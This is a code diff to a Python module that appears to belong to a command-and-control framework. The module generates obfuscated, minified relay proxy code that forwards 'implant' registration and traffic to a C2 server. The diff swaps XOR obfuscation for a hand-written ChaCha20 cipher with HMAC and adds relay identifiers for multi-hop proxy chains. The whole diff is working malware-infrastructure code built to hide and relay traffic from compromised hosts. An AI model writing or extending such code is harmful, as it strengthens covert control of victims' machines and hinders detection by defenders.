@@ -18,6 +18,7 @@ MODULE = {
         ("protocol", "默认 tls（当前仅 tls）"),
         ("server_key_hex", "可选；缺省从 server/config.json 读取 implant_key"),
         ("out_dir", "默认 s_modules/output"),
+        ("proxy_id", "可选；中继标识，转发 register 时 via=proxy:<id>（区分多级代理）"),
     ],
 }
 
@@ -27,7 +28,7 @@ _DEFAULT_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "output")
 
 _PROXY_CODE = '''\
-import socket as a,struct as b,zlib as c,base64 as d,json as e,threading as f
+import socket as a,struct as b,zlib as c,base64 as d,json as e,threading as f,secrets as l,hashlib as h,hmac as hm
 _SK=bytes({server_key})
 _PK=bytes({proxy_key})
 _SH={server_host!r}
@@ -35,9 +36,36 @@ _SP={server_port}
 _LP={listen_port}
 _CERT={cert!r}
 _KEY={key!r}
-def x(q,k):kl=len(k);return bytes(b^k[i%kl]for i,b in enumerate(q))
-def E(q,k):return d.b64encode(x(c.compress(q),k))
-def D(q,k):return c.decompress(x(d.b64decode(q),k))
+def Q(s,x,y,z,w):
+ s[x]=(s[x]+s[y])&0xffffffff
+ s[w]=((s[w]^s[x])<<16|(s[w]^s[x])>>16)&0xffffffff
+ s[z]=(s[z]+s[w])&0xffffffff
+ s[y]=((s[y]^s[z])<<12|(s[y]^s[z])>>20)&0xffffffff
+ s[x]=(s[x]+s[y])&0xffffffff
+ s[w]=((s[w]^s[x])<<8|(s[w]^s[x])>>24)&0xffffffff
+ s[z]=(s[z]+s[w])&0xffffffff
+ s[y]=((s[y]^s[z])<<7|(s[y]^s[z])>>25)&0xffffffff
+def B(k,n,ct):
+ s=[0x61707865,0x3320646e,0x79622d32,0x6b206574]+list(b.unpack("<8I",k))+[ct]+list(b.unpack("<3I",n))
+ w=s[:]
+ for _ in range(10):
+  Q(w,0,4,8,12);Q(w,1,5,9,13);Q(w,2,6,10,14);Q(w,3,7,11,15)
+  Q(w,0,5,10,15);Q(w,1,6,11,12);Q(w,2,7,8,13);Q(w,3,4,9,14)
+ return b.pack("<16I",*[(w[i]+s[i])&0xffffffff for i in range(16)])
+def X(dat,k,n):
+ buf=bytearray();t=0
+ for i in range(0,len(dat),64):
+  buf+=bytes(u^v for u,v in zip(dat[i:i+64],B(k,n,t)));t+=1
+ return bytes(buf)
+def E(q,k):
+ ek,mk=h.sha256(b"e"+k).digest(),h.sha256(b"m"+k).digest()
+ n=l.token_bytes(12);ct=X(c.compress(q),ek,n)
+ return d.b64encode(n+ct+hm.new(mk,n+ct,h.sha256).digest())
+def D(q,k):
+ z=d.b64decode(q);ek,mk=h.sha256(b"e"+k).digest(),h.sha256(b"m"+k).digest()
+ n,ct,tg=z[:12],z[12:-32],z[-32:]
+ if not hm.compare_digest(tg,hm.new(mk,n+ct,h.sha256).digest()):raise ValueError("MAC")
+ return c.decompress(X(ct,ek,n))
 def S(s,d,k):q=E(d,k);s.sendall(b.pack(">I",len(q))+q)
 def R(s,k):
  r=b""
@@ -67,7 +95,7 @@ def a2s(c,u):
  try:
   while 1:
    d=R(c,_PK);m=e.loads(d.decode())
-   if m.get("type")=="register":m["via"]="proxy"
+   if m.get("type")=="register":m["via"]={via!r}
    S(u,e.dumps(m).encode(),_SK)
  except:pass
 def s2a(c,u):
@@ -116,7 +144,8 @@ def _read_server_key() -> bytes:
     return None
 
 
-def run(host, port, protocol="tls", server_key_hex=None, out_dir=None):
+def run(host, port, protocol="tls", server_key_hex=None, out_dir=None,
+        proxy_id=None):
     """生成 Proxy 代码与部署命令。
 
     Args:
@@ -160,6 +189,7 @@ def run(host, port, protocol="tls", server_key_hex=None, out_dir=None):
         proxy_key=str(list(proxy_key)).replace(" ", ""),
         server_host=host, server_port=port, listen_port=listen_port,
         cert=cert["cert_pem"], key=cert["key_pem"],
+        via=(f"proxy:{proxy_id}" if proxy_id else "proxy"),
     )
     compile(code, "<proxy>", "exec")  # 生成即校验
 
